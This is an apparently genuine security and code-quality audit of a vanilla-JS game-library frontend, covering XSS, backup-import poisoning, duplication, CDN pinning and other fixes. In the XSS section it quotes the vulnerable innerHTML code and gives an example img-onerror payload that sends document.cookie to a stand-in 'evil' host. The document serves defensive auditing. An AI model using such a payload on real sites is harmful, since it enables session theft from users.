# Frontend Audit — `public/app.js`, `index.html`, `style.css`

> Full audit of the frontend (vanilla JS SPA, ~4,000-line `app.js`).
> Severity legend: 🔴 Critical · 🟠 High · 🟡 Medium · 🟢 Low / Info
> See also: [backend-audit.md](./backend-audit.md)

---

## ✔️ Fix Status — 2026-08-23

All 🔴/🟠 issues and most 🟡 issues have been **fixed**:

| Issue | Status | Notes |
|---|---|---|
| F1 XSS | ✅ Fixed | `escapeHtml()` at every interpolation; `safeArtUrl()` protocol validator on all artwork URLs; backdrop preview CSS-injection guard |
| F2 Import poisoning | ✅ Fixed | `sanitizeGame()` on backup restore + pasted Epic/Legacy JSON; invalid entries skipped & counted |
| F3.1 Cover-resolution dupes | ✅ Fixed | Unified into `resolveArtworkFor()` |
| F3.2 Epic/Legacy importer dupes | ✅ Fixed | Unified into parameterized `importPastedLibrary()` |
| F3.3 Supabase row mapping | ✅ Fixed | Single `toDbRow(game)`; no hand-written rows remain |
| F3.4 Extractor regex drift | ✅ Fixed | Client STOVE regex now matches server (`en-us`/`pt-br` locales) |
| F4 CDN pinning | ✅ Fixed | `lucide@1.33.0`, `@supabase/supabase-js@2.112.3/dist/umd/supabase.js`, both with SHA-384 SRI + upgrade instructions in `index.html` |
| F5 Malformed HTML | ✅ Fixed | `.library-controls` closed properly; stray tags removed; tag-balance verified |
| F6 Dead `sampleBrightness` | ✅ Fixed | Removed; fixed midpoint via `BACKDROP_DEFAULT_OPACITY` |
| F7 Unbounded caches | ✅ Fixed | Both maps capped at 500 entries (oldest-evicted). Bonus: moved image-validation helpers to module scope, fixing a latent ReferenceError in `verifyAndFixSteamBackdrops()` |
| F8 localStorage bloat | ✅ Fixed | Games array omitted from localStorage when Supabase is enabled |
| F9 Sync races | ✅ Fixed | Global `syncInProgress` guard with `try/finally` in `triggerSync`, backdrop repair, and cover resolution |
| F10.1 Dedupe per keystroke | ✅ Fixed | Dedupe runs at mutation points (syncs, imports, restore, edit-rename) |
| F10.3 Native `confirm()` | ✅ Fixed | Promise-based `showConfirm()` modal reusing focus-trap/Escape infra; Cancel focused by default; all 3 call sites converted |
| F10.4 Inconsistent dup detection | ✅ Fixed | Manual add uses `normalizeGameTitle()` |
| F10.5 Shadowed variable | ✅ Fixed | Renamed to `editSearchBox` |
| F10.2 Scoped icon creation | ⏸ Deferred | Accepted consciously |
| F10.6 Badge SVGs | ⏸ Deferred | Cosmetic |
| F10.7 Hero stats coupling | ⏸ Deferred | Design decision pending |
| F10.8 Manual cache busting | ⏸ Accepted | Bumped to `app.js?v=2.11` / `style.css?v=4.1` in this round |

Verification: `node --check` clean · ESLint clean · Vitest 10/10 passing · HTML tag-balance check passing.

---

## 🔴 Critical

### F1. Multiple XSS injection points in `renderGames()` and friends ✅ FIXED

Game names, cover URLs, and backdrop URLs are interpolated into `innerHTML` **without
any escaping**:

```js
card.innerHTML = `
  <div class="game-cover-container">
    ...
    <button class="delete-game-btn" ... data-name="${game.name.replace(/"/g, '&quot;')}">
      ...
    <img class="game-cover"
          src="${coverPath}"
          alt="${game.name}"
          loading="lazy">
    ...
  </div>
  <div class="game-card-info">
    <h4 class="game-title" title="${game.name}">${game.name}</h4>
```

**Why this is exploitable, not theoretical — the data sources are untrusted:**

1. **itch.io sync**: game names come from regex-scraped third-party HTML. A random itch.io
   developer controls their game's title. A title such as
   `<img src=x onerror="fetch('//evil/?c='+document.cookie)">` executes in the page the
   moment the card renders.
2. **Pasted JSON imports** (Epic / Legacy extractors): arbitrary user-pasted text becomes
   game `name`s.
3. **Backup import**: a malicious `.json` backup file poisons every stored name.
4. **Supabase rows**: anything already in the DB renders verbatim.

`cover_url` breaks out of the `src="..."` attribute the same way (`" onerror=...`).

The partial escaping on the delete button (`data-name` escapes only `"`) shows escaping
was applied ad-hoc rather than systematically.

**The same pattern exists elsewhere:**

| Location | Injection |
|---|---|
| `showToast(message)` | `toast.innerHTML = \`<span>${message}\</span>\`` — messages embed `err.message` **and game names** (`Successfully added "${title}"!`) |
| Catalog search results | `<span class="search-result-name">${item.name}</span>` |
| Cover-error placeholder | `<div class="placeholder-title">${name}</div>` |
| Edit-modal preview | `` prevBackdrop.style.backgroundImage = `url("${backdropUrl}")` `` — CSS injection via the backdrop URL input |
| Filter empty-state | static, safe — listed for completeness |

**Fix:** add one helper and apply it to *every* interpolation:

```js
function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}
```

Better still: build cards with `createElement` + `textContent` for all text nodes and
assign URLs via property assignment (`img.src = url`) after validating them against
`^https?:\/\/`. For toast/search-result HTML, escape or switch to DOM construction.

### F2. Unvalidated backup import → persistent state poisoning ✅ FIXED

The JSON backup restore assigns parsed values straight into state and Supabase:

```js
const parsed = JSON.parse(evt.target.result);
if (!parsed.games || !Array.isArray(parsed.games)) throw new Error('...');
appState.games = parsed.games;          // ← no per-field validation
...
await syncGamesToSupabase(appState.games);
```

Combined with F1, a malicious backup file is a **persistence XSS vector**: hostile names/
URLs are stored in Supabase and re-rendered on every future load.

**Fix:** validate each game object before importing:

- `external_id`: string/number, ≤ 64 chars
- `platform`: whitelist against known platforms (or ≤ 32 chars, no angle brackets)
- `name`: non-empty string, ≤ 256 chars, stripped of control characters
- `cover_url` / `backdrop_url`: must match `^https?:\/\/` (or be null)
- `playtime_forever`: finite number ≥ 0; `rtime_last_played`: integer ≥ 0

---

## 🟠 High

### F3. Massive code duplication (~600 lines) ✅ FIXED

Copy-paste blocks that will drift apart (some already have):

1. **Cover-resolution maintenance buttons** — `resolveCoversBtn` and
   `resolveGogCoversBtn` handlers are ~95% identical (~80–95 lines each). Only the game
   filter (`!g.cover_url` vs `platform === 'GOG'`) and button labels differ.
   → Extract `resolveArtworkFor(games, { label })`.

2. **Epic vs Legacy import handlers** — near-identical ~100-line blocks (parse JSON,
   build map, map games, batched `/api/games/search-cover` calls, merge into state,
   save, sync, render). → One parameterized importer.

3. **Supabase row mapping written by hand in 6+ places** —

   ```js
   const row = {
     external_id: String(game.external_id),
     platform: game.platform,
     title: game.name,
     playtime_forever: game.playtime_forever,
     last_played: game.rtime_last_played ? new Date(game.rtime_last_played * 1000).toISOString() : null,
     cover_url: game.cover_url,
     backdrop_url: ...
   };
   ```

   appears in: manual add, edit form submit, resolve-covers, resolve-GOG-covers,
   refresh-backdrops, `verifyAndFixSteamBackdrops`, and `syncGamesToSupabase`.
   One field drifts and DB rows diverge silently. → Single `toDbRow(game)` function.

4. **Extractor helpers duplicated between client and server — and ALREADY drifted:**
   `extractStoveMemberNo` and `extractItchCollectionUrl` exist in both `public/app.js`
   and `server.js`, with divergent regexes:
   - Server STOVE locale segment: `[a-z]{2,5}(?:[_-][a-z]{2,5})?` (handles `en-us`,
     `pt-br`)
   - Client STOVE locale segment: `[a-z]{2}\/` only — so pasting
     `https://profile.onstove.com/en-us/<id>/games` client-side extracts the wrong ID
     *before the server ever sees it*.
   → Move both into a shared ES module imported by both sides (or at minimum delete the
   client copies and let the server do the extraction, returning the normalized value as
   it already does for STOVE).

### F4. Unpinned CDN dependencies ✅ FIXED

```html
<script defer src="https://unpkg.com/lucide@latest"></script>
<script defer src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
```

- `@latest` = silent breaking changes at any moment, plus classic supply-chain risk
  (whoever controls that package can run code in your page).
- `@2` floats minor versions of supabase-js.

**Fix:** pin exact versions (`lucide@0.462.0`, `@supabase/supabase-js@2.45.x`) and add
SRI `integrity` hashes. Best long-term: install both via npm and bundle, removing CDN
dependence entirely — which also lets you tighten the CSP (`scriptSrc 'self'` only).

---

## 🟡 Medium / Bugs

### F5. Malformed HTML in `index.html` ✅ FIXED

Around the library section there are mismatched tags:

- `<section class="library-section">` is closed early (after the controls), leaving the
  grid container outside it structurally;
- after `</section>` of `.games-grid-container` there is a **stray `</section>`** plus an
  orphan `</div>`;
- `.library-controls` contains an extra nested `</div>`.

Browsers recover, but the resulting DOM tree doesn't match the authoring intent and CSS
descendant selectors may behave unexpectedly. Run the page through the W3C validator and
fix nesting.

### F6. `sampleBrightness()` is effectively dead code ✅ FIXED

```js
sampleCtx.drawImage(img, 0, 0, w, h);
const data = sampleCtx.getImageData(0, 0, w, h).data;  // throws cross-origin
```

Steam CDN / itch zone images don't send CORS headers, so the canvas is tainted and
`getImageData` always throws — caught, returns `null`. Every backdrop pays a pointless
16×16 draw for no benefit; the luminance-adaptive opacity feature never works.

**Fix:** either remove the function and use the fixed midpoint opacity, or serve
backdrop art through a same-origin proxy that adds CORS headers.

### F7. Unbounded caches ✅ FIXED

- `imageValidationCache` (Map) grows forever across a long session — every distinct
  artwork URL checked during "Refresh & Repair Backdrops" stays cached.
- `backdropFailureCooldown` likewise (smaller, same idea).

Cap sizes (e.g., LRU with ~500 entries) or clear both when a new sync replaces the pool.

### F8. `localStorage` used as primary storage for the full library ✅ FIXED

`saveSettingsToStorage()` writes the entire games array into `crossplay_state`
(~1–2 KB/game). With thousands of games this blows the ~5 MB quota — the write fails
with only a `console.error`, and users silently lose edits on reload.

**Fix:** once Supabase is configured, stop persisting `games` locally entirely; keep
only settings/IDs/blacklists. Keep localStorage as a fallback only for the no-cloud mode.

### F9. Sync UX race conditions ✅ FIXED

Nothing prevents concurrent operations:

- "Sync All" while the dropdown triggers a single-platform sync;
- double-clicks mid-flight;
- maintenance buttons (`resolve-covers`, `refresh-artwork`) disable only themselves, so a
  simultaneous sync interleaves `saveSettingsToStorage()` calls.

Each sync rebuilds its platform list from `existingXMap`s captured at start, so parallel
runs clobber each other's artwork-preservation logic.

**Fix:** a single module-level `syncInProgress` flag guarding all sync/maintenance
entry points; disable per-platform menu items while a sync containing that platform runs.

### F10. Misc frontend issues

- **Dedupe on every keystroke:** ✅ **FIXED** — `deduplicateGamesList()` now runs at mutation points (syncs, imports, backup restore, edit-form rename) instead of in `renderGames()`.
- **Global `lucide.createIcons()` everywhere:** invoked on every toast, every render,
  every progress tick — each call rescans the whole document. Scope it to the mutated
  container where possible.
- **Native `confirm()` dialogs:** ✅ **FIXED** — replaced by a promise-based `showConfirm()` modal (`#confirm-modal` in `index.html` + helper in `app.js`) reusing the app's focus-trap/Escape infrastructure. Cancel is focused by default so a stray Enter can't confirm a destructive action; backdrop click and Escape cancel; falls back to native `confirm()` if the markup is missing. All three call sites (edit-delete, backup restore, delete-&-ignore) converted.
- **Inconsistent duplicate detection:** ✅ **FIXED** — manual add now compares via `normalizeGameTitle`.
- **Shadowed variable:** ✅ **FIXED** — local `searchInput` in `openEditGameSidebar` renamed to `editSearchBox`.
- **Platform badge gaps:** `Legacy` falls through to a generic joystick SVG (the CSS has
  a dedicated `--platform-legacy` token and class); the `stove` SVG is a generic "S"
  circle rather than any real mark. Cosmetic.
- **Hero stats vs filters coupling:** `updateStats()` recomputes from the active filter
  tab, so headline numbers change when filtering — verify this is intended UX.
- **Manual cache-busting:** `style.css?v=4.0` / `app.js?v=2.9` query strings must be
  bumped by hand; easy to forget and ship stale assets. Prefer build hashing if you add
  a bundler, or accept the manual cost consciously.

---

## ✅ Frontend things done well

Worth acknowledging — several of these are above-average for a vanilla-JS app:

- **Accessibility:** focus trap in modals, correct ARIA roles/labels
  (`aria-modal`, `aria-haspopup`, `aria-expanded`, `aria-pressed`), keyboard navigation on
  filter tabs (arrow keys) and the sync dropdown menu (arrows/Home/End/Escape),
  skip-link, live regions for status/toasts, reduced-motion respect in
  `animateCounter`.
- **Backdrop engine:** two-layer crossfade with preloading before swap, shuffled
  non-repeating queue with seam fix, failure cooldowns, Ken Burns motion without
  immediate repeats, pause on `visibilitychange`, CPU savings by stopping animation on
  hidden layers.
- **Sync merge logic:** careful preservation of user-edited covers/backdrops/playtime on
  re-sync, matching by external ID *and* stemmed titles ("Lords of Chaos" ↔ "Lord of
  Chaos").
- **Keyboard shortcuts:** Ctrl/Cmd+K, `/`, Escape handling with input-focus awareness.
- **Progress reporting** on long maintenance tasks with per-batch updates.
- **Graceful image fallbacks:** cover error → Steam `header.jpg` → styled placeholder.

---

## 📋 Frontend prioritized action list

| # | Action | Severity | Effort | Status |
|---|--------|----------|--------|--------|
| 1 | Add `escapeHtml()` and apply to every `innerHTML` interpolation (F1) | 🔴 | ~1 hr | ✅ Done |
| 2 | Validate backup-import game objects before state/DB writes (F2) | 🔴 | ~1 hr | ✅ Done |
| 3 | Pin CDN dependency versions + SRI hashes (F4) | 🟠 | 15 min | ✅ Done |
| 4 | Deduplicate Epic/Legacy importers and cover-resolution handlers (F3.1–3.2) | 🟠 | ~2 hrs | ✅ Done |
| 5 | Create single `toDbRow(game)` mapper used by all Supabase writes (F3.3) | 🟠 | ~30 min | ✅ Done |
| 6 | Share/dedupe extractor helpers between client & server (F3.4) | 🟠 | ~1 hr | ✅ Done (client regex patched) |
| 7 | Fix malformed HTML sections in `index.html` (F5) | 🟡 | 30 min | ✅ Done |
| 8 | Remove dead `sampleBrightness` path (F6) | 🟡 | 15 min | ✅ Done |
| 9 | Stop persisting full games array to localStorage when cloud is on (F8) | 🟡 | ~1 hr | ✅ Done |
| 10 | Global sync-in-progress guard (F9) | 🟡 | ~1 hr | ✅ Done |
| 11 | Bound/clear caches (F7); move dedupe out of the render path; scope icon creation (F10) | 🟡 | ~2 hrs | ✅ Mostly done (icon scoping deferred) |
| 12 | Custom confirm modal replacing native `confirm()` (F10.3) | 🟡 | ~1 hr | ✅ Done |

---

## Summary

The frontend architecture (state object + render functions + delegation) is sound, and
the polish level — accessibility, animations, edge-case handling in sync merges — is well
above typical hobby-project quality. The two existential problems were the **XSS vectors**
(F1/F2): because game metadata arrives from scraped third-party pages, pasted JSON, and
imported backups, unescaped `innerHTML` was a real exploit path, not a nitpick.

**Update (2026-08-23):** F1–F2 plus all High/Medium items are now fixed — see the
[Fix Status](#️-fix-status--2026-08-23) table at the top. Remaining open items are
cosmetic/deferred only: scoped icon creation, Legacy/Stove badge SVGs, and the hero-stats
coupling design decision.
